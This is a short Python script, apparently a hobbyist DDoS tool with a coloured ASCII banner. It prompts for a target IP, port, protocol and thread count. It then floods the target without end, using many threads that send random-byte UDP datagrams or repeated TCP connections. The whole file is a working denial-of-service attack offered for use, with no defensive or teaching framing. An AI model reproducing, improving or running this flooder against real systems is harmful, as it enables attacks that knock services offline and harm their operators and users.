import random
import socket
import threading, os
import threading, random
from colorama import Fore, init

init(convert=True)
textcol = f"{Fore.BLACK}"

def head():
    print(f"""{Fore.RED}
                                           

                    {Fore.RED}                Usage : [Python] [TCP] [UDP]
                    {Fore.BLUE}                METHOD : [>]TCP             
                    {Fore.BLUE}                         [>]UDP                  01     .88'             d88b           88          88    
                    {Fore.BLUE}                                                 10    88'              d8''8b          88          88    
                    {Fore.BLUE}                                                 01  d88               d8'  '8b         88          88
                    {Fore.BLUE}                                                 1001'88.             d8YaaaaY8b        88          88
                    {Fore.BLUE}                                                 01p   Y8b           d8''''''''8b       88          88
                    {Fore.BLUE}                                                 10      '88.       d8'         '8b     88          88
                    {Fore.BLUE}                                                 01         Y8b   d8'             '8b   8888888888  88


                          
                                                                                                                                                              """)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def newpage():
    clear()
    head()

newpage()
print("\n")
print("")
ip = str(input(Fore.LIGHTBLUE_EX + " IP:~$"))
port = int(input(Fore.RED + " Port:~$"))
choice = str(input(Fore.YELLOW + " UDP(y/n):~$"))
times = int(input(Fore.LIGHTYELLOW_EX + " Packets per one connection:~$"))
threads = int(input(Fore.YELLOW + " Threads:~$"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(Fore.GREEN + " Sent!!!")
		except:
			print(Fore.RED + "Error")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(Fore.GREEN + " Sent!!!")
		except:
			s.close()
			print(Fore.RED + "Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
